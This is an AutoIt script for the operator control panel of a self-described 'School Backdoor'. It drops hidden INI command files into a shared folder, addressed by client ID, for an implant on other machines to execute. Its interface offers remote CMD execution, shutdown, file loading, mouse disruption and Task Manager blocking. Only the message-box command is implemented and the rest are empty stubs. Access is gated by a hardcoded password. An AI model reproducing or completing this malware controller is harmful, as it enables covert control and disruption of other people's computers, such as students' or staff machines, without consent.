#cs ----------------------------------------------------------------------------

 Devil ControlPanel ( School Backdoor )
 AutoIt Version: 3.3.14.2

#ce ----------------------------------------------------------------------------

#NoTrayIcon
#include <File.au3>
#include <Misc.au3>
#include <MsgBoxConstants.au3>
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

; The program will not start twice
_Singleton("devil_check_controlpanel", 0)

; Variables
Local $Password = "qwerty" ; There must be a password for accessing the command panel!
Global $ClientID = ""

; Exit hotkey
HotKeySet("{ESC}", "FastClosing")

; Password protection
Local $Entered_Password = InputBox("Devil ControlPanel", "Enter the password to access the control panel!", "", "*", 270, 130)
If Not($Entered_Password = $Password) Then
    MsgBox($MB_ICONERROR, "Devil Control Panel", "Wrong password!")
    Exit
EndIf

; Select shared folder ( server )
Global $Server_Directory = FileSelectFolder("Enter location of the shared folder!", "C:\")

; ------------------------------------------------------------------------------

; GUI
$ControlPanel = GUICreate("Devil ControlPanel", 301, 316, -1, -1)
GUISetBkColor(0xFFFFFF)
$Group1 = GUICtrlCreateGroup("Actions", 16, 48, 265, 153)
$ShowMessageBox_Button = GUICtrlCreateButton("SHOW MESSAGE BOX", 24, 72, 251, 25)
$ExecuteToCMD_Button = GUICtrlCreateButton("EXECUTE TO CMD", 24, 104, 251, 25)
$Shutdown_Button = GUICtrlCreateButton("SHUTDOWN", 24, 136, 251, 25)
$LoadFile_Button = GUICtrlCreateButton("LOAD FILE", 24, 168, 123, 25)
$WriteLogs_Button = GUICtrlCreateButton("WRITE LOGS", 160, 168, 115, 25)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Text = GUICtrlCreateLabel("Client ID", 16, 18, 62, 20)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
$InputBox = GUICtrlCreateInput("", 88, 16, 193, 21)
$Group2 = GUICtrlCreateGroup("Crazy Mouse", 16, 216, 129, 89)
$CrazyMouse_EnableButton = GUICtrlCreateButton("Enable", 24, 240, 107, 25)
$CrazyMouse_DisableButton = GUICtrlCreateButton("Disable", 24, 272, 107, 25)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group3 = GUICtrlCreateGroup("Block Task Manager", 160, 216, 121, 89)
$BlockTaskManager_EnableButton = GUICtrlCreateButton("Enable", 168, 240, 99, 25)
$BlockTaskManager_DisableButton = GUICtrlCreateButton("Disable", 168, 272, 99, 25)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)

; ------------------------------------------------------------------------------

; Loop
While True
    Sleep(10)
	$GUICommand = GUIGetMsg()
	Switch $GUICommand
		Case $GUI_EVENT_CLOSE
			Exit
        Case $ShowMessageBox_Button
            ShowMessageBox()
        Case $ExecuteToCMD_Button
        Case $Shutdown_Button
        Case $LoadFile_Button
        Case $WriteLogs_Button
        Case $CrazyMouse_EnableButton
        Case $CrazyMouse_DisableButton
        Case $BlockTaskManager_EnableButton
        Case $BlockTaskManager_DisableButton
	EndSwitch
WEnd

; ------------------------------------------------------------------------------

; Show message box
Func ShowMessageBox()
    $ClientID = GUICtrlRead($InputBox)
    If $ClientID = "" Then
        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
    Else
        FileCopy("Data_example.ini", $Server_Directory & "\" & $ClientID & "_temp")
        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
        Local $MessageBox_Text = InputBox("Devil ControlPanel", "Enter the text that will be displayed.", "", "", 270, 130)
        IniWrite($Server_Directory & "\" & $ClientID & "_temp", "Data", "Type", "show_message")
        IniWrite($Server_Directory & "\" & $ClientID & "_temp", "Data", "Command", $MessageBox_Text)
        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
        Sleep(1000) 
    EndIf
EndFunc

Func FastClosing()
    Exit
EndFunc